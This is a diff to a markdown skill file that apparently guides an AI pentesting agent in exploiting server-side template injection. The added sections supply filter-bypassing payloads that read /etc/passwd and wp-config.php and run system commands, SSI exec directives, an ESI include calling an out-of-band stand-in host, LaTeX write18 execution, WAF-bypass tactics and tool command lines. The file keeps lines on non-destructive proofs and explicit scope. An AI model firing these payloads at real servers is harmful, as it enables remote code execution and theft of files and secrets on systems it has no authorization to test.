@@ -1,7 +1,37 @@
 ---
 name: ssti
 description: >-
-  Use ssti when recon shows user-supplied text flowing into a server-side template engine and being rendered back into the page, document, or message. The strongest routing signal is a technology fingerprint of a stack that ships a template engine — Flask or Django (Jinja2, Mako), Symfony or Laravel (Twig, Blade), Spring (Thymeleaf, Freemarker, Velocity), Rails (ERB, Liquid), or Node (EJS, Pug, Nunjucks, Handlebars) — combined with a parameter that is reflected into server-generated HTML. Equally telling are features whose whole purpose is to render user content: email or newsletter template editors, invoice and report generators, merge-tag or placeholder fields that advertise tokens like a first-name or customer-name variable, custom 404 or error-page builders, profile bios, signature blocks, white-label or multi-tenant theming, and any UI that calls itself a "template". Header, cookie, filename, or search values that later appear inside an admin-rendered template fit the blind or second-order case. Dispatch when the objective is reaching server-side code execution or reading server files through such a rendering sink. Disambiguate from look-alikes that share the reflected-input surface: a value that only computes math once JavaScript runs in the browser, or whose delimiters are evaluated client-side by a framework like AngularJS or Vue, is client-side template injection routed to XSS; a value reflected into HTML but never evaluated as code is plain reflected XSS; an expression sink with no rendering template behind it (Spring request params, Struts OGNL, a Log4j JNDI lookup string) is expression-language or JNDI injection, not SSTI; and a value placed into an SQL or printf-style format string is SQL injection or format-string injection. The single tell for ssti is that some server-side template engine, not the browser, parses the input as a template before the response is sent. This skill starts with the universal probe {{7*7}}, identifies the exact engine via differential test inputs, escalates through config disclosure and server file read to code execution, and covers blind SSTI via timing or out-of-band callbacks when output is suppressed.
+  Use: Use ssti when recon shows user-supplied text flowing into a server-side template engine and
+  being rendered back into the page, document, or message.
+  Signals: The strongest routing signal is a technology fingerprint of a stack that ships a template
+  engine — Flask or Django (Jinja2, Mako), Symfony or Laravel (Twig, Blade), Spring (Thymeleaf,
+  Freemarker, Velocity), Rails (ERB, Liquid), or Node (EJS, Pug, Nunjucks, Handlebars) — combined
+  with a parameter that is reflected into server-generated HTML. Equally telling are features whose
+  whole purpose is to render user content: email or newsletter template editors, invoice and report
+  generators, merge-tag or placeholder fields that advertise tokens like a first-name or
+  customer-name variable, custom 404 or error-page builders, profile bios, signature blocks,
+  white-label or multi-tenant theming, and any UI that calls itself a "template". Header, cookie,
+  filename, or search values that later appear inside an admin-rendered template fit the blind or
+  second-order case. Dispatch when the objective is reaching server-side code execution or reading
+  server files through such a rendering sink. Disambiguate from look-alikes that share the
+  reflected-input surface: a value that only computes math once JavaScript runs in the browser, or
+  whose delimiters are evaluated client-side by a framework like AngularJS or Vue, is client-side
+  template injection routed to XSS; a value reflected into HTML but never evaluated as code is plain
+  reflected XSS; an expression sink with no rendering template behind it (Spring request params,
+  Struts OGNL, a Log4j JNDI lookup string) is expression-language or JNDI injection, not SSTI; and a
+  value placed into an SQL or printf-style format string is SQL injection or format-string
+  injection. The single tell for ssti is that some server-side template engine, not the browser,
+  parses the input as a template before the response is sent. This skill starts with the universal
+  probe {{7*7}}, identifies the exact engine via differential test inputs, escalates through config
+  disclosure and server file read to code execution, and covers blind SSTI via timing or out-of-band
+  callbacks when output is suppressed.
+  Pair with: Also dispatch xss in parallel when the same reflected-rendering evidence could be
+  browser-side rather than server-side; dispatch rce or lfi separately only when recon already shows
+  an independent command/file-read sink, not merely because SSTI may escalate there; co-dispatch
+  means separate focused workers sharing the same investigation state, not merging skill prompts.
+  Do not use: Do not dispatch when the described input surface is absent, when the value is only
+  stored or echoed without reaching this skill's mechanism, or when another specialist's sink
+  explains the evidence more directly.
 metadata:
   dispatchable: true
 ---
@@ -166,6 +196,51 @@ EJS:
 Twig sandbox: look for unsafe filters whitelisted by the app, `_self`
 exposure, or extension classes loaded with the sandbox.
 
+## INCLUDE-statement tags & charless payloads
+When the `.`/`(`/`[` member-access syntax is filtered but the engine still
+parses statement tags (`{% ... %}`), pivot to INCLUDE/SET tags and to
+character-built strings that carry no letters, quotes, or spaces.
+
+- **Twig `include()`** reads any file the engine can resolve — quieter than RCE:
+  `{{include("wp-config.php")}}`, `{{include("/etc/passwd")}}`.
+- **Quote-less filename** (no literal string survives the filter): point an
+  `include` at a slice of an introspection dump —
+  `FILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }}`.
+- **Charless `id`** — build the command from char codes so keyword filters miss
+  it. Blade/Smarty: `{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}`.
+- **No-space command** in Twig `filter('system')`: `{{['cat$IFS/etc/passwd']|filter('system')}}`
+  or `{{['cat\x20/etc/passwd']|filter('system')}}`.
+- **Twig `_charset`/block obfuscation** (no quoted command literal):
+  `{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}}`.
+- **`{% import %}` statement** in Tornado/Mako reaches `os` without dotted globals:
+  `{% import os %}{{os.system('id')}}`.
+- Modern Twig (sandbox/version-gated) `map`/`reduce`/`call_user_func` chains and
+  the double-rendering `_context` payload live in `references/node-dotnet-other-engines.md`.
+
+## Sibling include/markup sinks: SSI, ESI, LaTeX
+The same routing evidence (user text rendered into a server-built page,
+document, or message) can land on a non-template engine. Probe these when
+`{{...}}`/`${...}` render literally but the value still reaches a server-side
+renderer — especially `.shtml` pages, caching proxies, and PDF/invoice/report
+generators.
+
+- **Server-Side Includes (SSI)** — directive form `<!--#directive param="value" -->`.
+  Fires on Apache `mod_include`/`.shtml`, often where a reflected value lands in
+  server-rendered HTML. Quick probe `<!--#echo var="DATE_LOCAL" -->` (prints a
+  date) → escalate `<!--#exec cmd="id" -->`, file read
+  `<!--#include file="/etc/passwd" -->`, env dump `<!--#printenv -->`.
+- **Edge-Side Includes (ESI)** — injected `<esi:...>` tags are processed by the
+  caching surrogate (Squid, Varnish, Fastly, Akamai), turning reflection into
+  SSRF/XSS. Blind probe `<esi:include src="http://OOB.example.net/">` (a callback
+  confirms it); `<esi:include src="supersecret.txt">` reads files; some need
+  `Surrogate-Control: content="ESI/1.0"`.
+- **LaTeX injection** — user text compiled into a `.tex` document (PDF/report
+  generators). File read `\input{/etc/passwd}` or `\lstinputlisting{/etc/passwd}`;
+  RCE only if `--shell-escape` is on: `\immediate\write18{id > o}\input{o}`.
+
+See `references/ssi-esi-latex.md` for the full directive/variable catalogue,
+ESI per-software capability table, and LaTeX catcode/charless bypasses.
+
 ## Workflow
 1. **Map sinks**: spider URL params, forms, headers, JSON keys. Use
    `waybackurls | qsreplace "ssti{{9*9}}"` then `ffuf -mr "ssti81"`.
@@ -186,8 +261,13 @@ exposure, or extension classes loaded with the sandbox.
    out-of-band (DNS exfil to a controlled domain via the engine's HTTP
    filter or `nslookup`).
 9. **WAF bypass**: switch to `|attr()`, hex/octal encoding, string
-   concatenation, or arithmetic-built strings.
-10. **Drop a non-destructive PoC** and stop. Do not pivot without
+   concatenation, charless `chr()` building, `$IFS`/no-space variants, or
+   INCLUDE/SET statement tags when member-access syntax is filtered.
+10. **Sibling-sink fallback**: if every template syntax renders literally but
+    the value still reaches a server renderer, probe SSI
+    (`<!--#echo var="DATE_LOCAL" -->`), ESI (`<esi:include src="http://OOB/">`),
+    and LaTeX (`\input{/etc/passwd}`) per `references/ssi-esi-latex.md`.
+11. **Drop a non-destructive PoC** and stop. Do not pivot without
     explicit scope.
 
 ## Validation
@@ -199,6 +279,10 @@ A finding is real only when at least one holds:
 - Command execution returns the output of `id`, `whoami`, or `hostname`
 - Blind: out-of-band callback fires, or timing payload causes a measurable
   delay (>5s vs baseline)
+- Sibling sink: SSI `<!--#echo var="DATE_LOCAL" -->` renders a real date, or
+  `<!--#exec cmd="id" -->` returns command output; ESI `<esi:include src="http://OOB/">`
+  fires an OOB callback; LaTeX `\input{/etc/passwd}` leaks file contents into the
+  rendered document
 
 Reject false positives:
 - Math evaluating only in the browser → XSS, not SSTI
@@ -218,8 +302,12 @@ Freemarker) is the OPPOSITE of safe: the engine is confirmed present.
 - `curl` and `httpie` for manual payload injection
 - `ffuf` + `qsreplace` for parameter fuzzing
 - `tplmap` — automated SSTI detection and exploitation
-- `SSTImap` — modern fork: `python3 sstimap.py -u "URL?p=x" -s`
-- `TInjA` — `tinja url -u "URL"` for engine identification
+- `SSTImap` — modern fork: `python3 sstimap.py -u "URL?p=x" -s`; also covers SSI
+  with `--legacy` or `-e SSI`
+- `TInjA` — `tinja url -u "URL"` for engine identification; novel polyglots, e.g.
+  `tinja url -u "URL?name=x" -H "Authorization: Bearer ..."`
+- Hackmanit Template-Injection-Table — the expected polyglot responses for 44
+  engines, for fast fingerprinting
 - `crithit` — SSTI fuzzer covering Tera, Blade, Mako (2024)
 - `nuclei` — `templates/ssti-*` signatures
 - Burp extensions: Template Injector, Param Miner
@@ -228,6 +316,13 @@ Freemarker) is the OPPOSITE of safe: the engine is confirmed present.
 - Always start with the universal polyglot `${{<%[%'"}}%\` then `{{7*7}}` on every parameter.
 - Never report SSTI without confirming server-side evaluation. Browser-side math is XSS, not SSTI.
 - Identify the engine before crafting RCE payloads — wrong syntax wastes the parameter.
+- If one delimiter family is blocked or stripped (`{{...}}`, `${...}`,
+  `<%...%>`) but another family reaches the renderer (`{%...%}`,
+  comments, control/statement tags, filters, includes, macros), switch
+  grammar families on the same sink. This is a template-engine inference
+  step, not a one-payload trick: enumerate which characters and delimiters
+  survive, then choose file-read/config/RCE primitives that fit the
+  allowed grammar.
 - Do not hardcode subclass indices (e.g. Popen index in Jinja2). Enumerate at runtime; indices change between Python versions.
 - Prefer non-destructive PoC (`id`, `whoami`, `touch /tmp/ssti_poc.txt`) over anything that mutates the target.
 - Treat SSTI as CRITICAL by default — it leads to RCE in most engines.
